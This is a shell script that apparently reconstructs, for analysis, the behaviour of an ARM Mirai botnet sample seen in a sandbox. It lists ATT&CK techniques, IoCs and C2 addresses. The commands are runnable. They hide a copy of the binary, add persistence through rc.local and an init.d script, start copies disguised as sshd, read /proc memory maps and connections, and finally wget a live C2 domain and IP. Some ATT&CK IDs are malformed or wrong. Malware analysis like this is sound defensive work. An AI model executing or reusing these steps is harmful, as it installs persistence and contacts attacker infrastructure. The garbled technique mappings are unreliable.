#!/bin/sh
# =============================================================================
# RECONSTRUCTED MALWARE BEHAVIOUR — NOT THE ORIGINAL BINARY
# =============================================================================
# Family:       Mirai / Botnet
# Architecture: ARM
# SHA256:       448db7769765a324fca7100842fb2897718a5efd5cfbeb193364404c55b0a642
# Source:       MalwareBazaar - tria.ge: https://tria.ge/260325-pn9dvsfy8t/behavioral1
# Analysed via: tria.ge — debian-9_armhf — static score: 1/10 - dynamic score: 6/10
# MITRE ATT&CK: T1547 (Boot or Logon Autostart Execution), T1037.004 (RC Scripts), T1003 (OS Cred Dumping)
#		T1003.007 (Proc Filesystem), T10106 (system network conf), T10106.001 & T1049
# C2:           asdfavae.duckdns.org (upload & download) -  159.223.171.199:47594 (Upload)
# =============================================================================



# PHASE 1 — Copy & Hide binary
# Observed: Malware copies the binary to /usr/bin
# Purpose:  Hides the copy into a hidden location, assumed for future application if deleted
# IoCs:    wpa_supplicant /usr/bin/.sh (confirmed in tria.ge file writes)
# Reference: https://attack.mitre.org/techniques/T1564/001/
cp wpa_supplicant /usr/bin/.sh

# PHASE 2 — Persistance
# Observed: Malware modifies sysd & rc local
# Purpose:  Changes system daemon and admin privileges to ensure malware runs if PC is restarted
# IoCs:    /etc/init.d/sysd - /etc/rc.local
# Reference: T1547 - T1037 - T1037.004 - 
echo '/usr/bin/.sh &' >> /etc/rc.local
echo '/usr/bin/.sh &' > /etc/init.d/sysd
chmod +x /etc/init.d/sysd

# PHASE 3 — Process Name Masquerading
# Observed: Renames certain PIDs 
# Purpose:  Renames the process name, in an attempt to hide itselg
# IoCs:    cp /usr/bin/.sh /tmp/{sshd | wpa_supplicant}
# Reference: T1036
cp /usr/bin/.sh /tmp/sshd
cp /usr/bin/.sh /tmp/wpa_supplicant
/tmp/sshd &
/tmp/wpa_supplicant &

# PHASE 4 - Network Discovery
# Observed: Reads from TCP
# Purpose: To list all active TCP/TCP6 connections for internet access
# IoCs: cat /proc/net/tcp6
# Reference: T1016 & T1016.001 & T1049
cat /proc/net/tcp
cat /proc/net/tcp6

# PHASE 5 - Process Enumeration
# Observed: Reads runtime system information
# Purpose: Reads data from /proc to scan the environment for reconissance, evasion detection & persistence
# Reference: T0157
cat /proc/133/stat
cat /proc/133/cmdline
cat /proc/583/stat
cat /proc/583/cmdline
cat /proc/631/stat
cat /proc/631/cmdline
cat /proc/664/stat
cat /proc/664/cmdline

# PHASE 6 - Memory Scraping
# Observed: Reading data from memory
# Purpose: To scrape credentials and sensitive information like encryption leys
# IoCs: cat /proc/[PID]/maps
cat /proc/133/maps
cat /proc/583/maps
cat /proc/631/maps
cat /proc/664/maps
cat /proc/722/maps
cat /proc/759/maps
cat /proc/763/maps
cat /proc/765/maps
cat /proc/775/maps
cat /proc/790/maps
cat /proc/796/maps
cat /proc/802/maps
cat /proc/808/maps
cat /proc/814/maps
cat /proc/824/maps
cat /proc/828/maps
cat /proc/832/maps
cat /proc/849/maps
cat /proc/851/maps
cat /proc/854/maps

# PHASE 7 - C2 Beacon
# Domain
wget http://asdfavae.duckdns.org/
# Resolved IP
wget http://159.223.171.199:47594/







